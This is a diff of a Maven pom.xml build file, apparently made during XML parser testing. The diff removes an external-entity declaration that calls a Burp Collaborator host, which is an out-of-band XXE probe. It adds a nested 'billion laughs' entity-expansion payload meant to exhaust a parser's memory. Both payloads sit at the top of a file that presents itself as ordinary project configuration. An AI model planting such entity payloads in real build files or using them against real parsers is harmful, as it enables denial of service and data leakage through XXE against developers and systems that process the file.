@@ -1,5 +1,18 @@
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY % init SYSTEM "https://cm2tk9ir7r7nfgfotkce5whncei66v.burpcollaborator.net"> %init;]>
+<!DOCTYPE replace [
+
+<!ENTITY example9 "cm2tk9ir7r7nfgfotkce5whncei66vasdf">
+<!ENTITY example8 "&example9;&example9;&example9;&example9;&example9;&example9;&example9;&example9;&example9;&example9;">
+<!ENTITY example7 "&example8;&example8;&example8;&example8;&example8;&example8;&example8;&example8;&example8;&example8;">
+<!ENTITY example6 "&example7;&example7;&example7;&example7;&example7;&example7;&example7;&example7;&example7;&example7;">
+<!ENTITY example5 "&example6;&example6;&example6;&example6;&example6;&example6;&example6;&example6;&example6;&example6;">
+<!ENTITY example4 "&example5;&example5;&example5;&example5;&example5;&example5;&example5;&example5;&example5;&example5;">
+<!ENTITY example3 "&example4;&example4;&example4;&example4;&example4;&example4;&example4;&example4;&example4;&example4;">
+<!ENTITY example2 "&example3;&example3;&example3;&example3;&example3;&example3;&example3;&example3;&example3;&example3;">
+<!ENTITY example "&example2;&example2;&example2;&example2;&example2;&example2;&example2;&example2;&example2;&example2;">
+
+
+]>
 <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
   <modelVersion>4.0.0</modelVersion>
